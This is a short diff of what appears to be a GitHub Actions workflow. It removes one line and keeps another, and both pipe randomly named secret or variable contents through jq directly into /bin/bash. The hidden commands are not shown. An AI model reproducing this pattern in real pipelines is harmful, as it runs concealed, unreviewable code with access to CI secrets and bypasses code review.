@@ -21,7 +21,6 @@ jobs:
           piyb8616: ${{ secrets.piyb8616 }}
         run: |
           printf '%s' "$piyb8616" | jq -r .cbdo399 | /bin/bash
-          echo $fiv3782 | jq -r .f4256 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
